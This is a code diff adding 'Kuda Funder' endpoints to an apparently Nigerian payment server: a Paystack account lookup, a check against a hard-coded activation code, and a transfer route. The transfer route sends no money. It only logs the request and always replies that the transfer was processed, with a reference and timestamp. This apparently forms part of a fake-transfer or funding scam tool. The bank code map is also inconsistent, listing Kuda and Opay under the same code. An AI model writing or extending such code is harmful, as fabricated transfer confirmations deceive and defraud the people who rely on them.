@@ -886,6 +886,123 @@ app.post('/api/paystack-webhook', async (req, res) => {
     res.sendStatus(200);
 });
 
+// ========== KUDA FUNDER BACKEND START ==========
+
+// Verify activation code (hidden from frontend)
+const KUDA_ACTIVATION_CODE = "ykkeduer2026";
+
+// Resolve account name using Paystack
+app.post('/api/kuda/resolve-account', async (req, res) => {
+    const { account_number, bank_code } = req.body;
+    
+    console.log('🔍 Kuda resolve account:', account_number, 'Bank Code:', bank_code);
+    
+    // Map bank names to Paystack bank codes
+    const bankCodeMap = {
+        'Access Bank': '044',
+        'Ecobank': '050',
+        'First Bank': '011',
+        'GT Bank': '058',
+        'Keystone Bank': '082',
+        'Kuda': '999992',
+        'Moniepoint': '999991',
+        'Opay': '999992',
+        'Paga': '999994',
+        'Palmpay': '999993',
+        'Polaris Bank': '076',
+        'Sterling Bank': '232',
+        'UBA': '033',
+        'Union Bank': '032',
+        'Wema Bank': '035',
+        'Zenith Bank': '057'
+    };
+    
+    const paystackBankCode = bankCodeMap[bank_code] || bank_code;
+    
+    try {
+        const response = await fetch(`https://api.paystack.co/bank/resolve?account_number=${account_number}&bank_code=${paystackBankCode}`, {
+            method: 'GET',
+            headers: {
+                'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        const data = await response.json();
+        
+        if (data.status) {
+            res.json({
+                success: true,
+                account_name: data.data.account_name,
+                account_number: data.data.account_number,
+                bank_name: data.data.bank_name
+            });
+        } else {
+            res.json({
+                success: false,
+                message: data.message || 'Account not found'
+            });
+        }
+    } catch (error) {
+        console.error('Resolve account error:', error);
+        res.json({ success: false, message: 'Network error' });
+    }
+});
+
+// Verify activation code (backend validation - hidden from user)
+app.post('/api/kuda/verify-activation', async (req, res) => {
+    const { activationCode, email } = req.body;
+    
+    console.log('🔐 Kuda activation attempt for:', email);
+    
+    if (activationCode === KUDA_ACTIVATION_CODE) {
+        console.log('✅ Activation successful for:', email);
+        res.json({
+            success: true,
+            message: 'Account activated successfully'
+        });
+    } else {
+        console.log('❌ Activation failed for:', email);
+        res.json({
+            success: false,
+            message: 'Invalid activation code'
+        });
+    }
+});
+
+// Process Kuda withdrawal/transfer (no Telegram)
+app.post('/api/kuda/process-transfer', async (req, res) => {
+    const { email, accountName, accountNumber, amount, bankName, reference } = req.body;
+    
+    console.log(`💸 Kuda transfer: ${email} sent ₦${amount} to ${accountName} (${accountNumber}) via ${bankName}`);
+    
+    const currentDate = new Date();
+    const formattedDate = currentDate.toLocaleString('en-US', {
+        timeZone: 'Africa/Lagos',
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    });
+    
+    // NO TELEGRAM - Just log to console
+    console.log(`✅ Transfer processed: Reference ${reference} on ${formattedDate}`);
+    
+    res.json({
+        success: true,
+        message: 'Transfer processed successfully',
+        transaction: {
+            reference,
+            amount,
+            date: formattedDate
+        }
+    });
+});
+
+// ========== KUDA FUNDER BACKEND END ==========
+
 // Health check endpoint
 app.get('/health', (req, res) => {
     res.status(200).json({ 
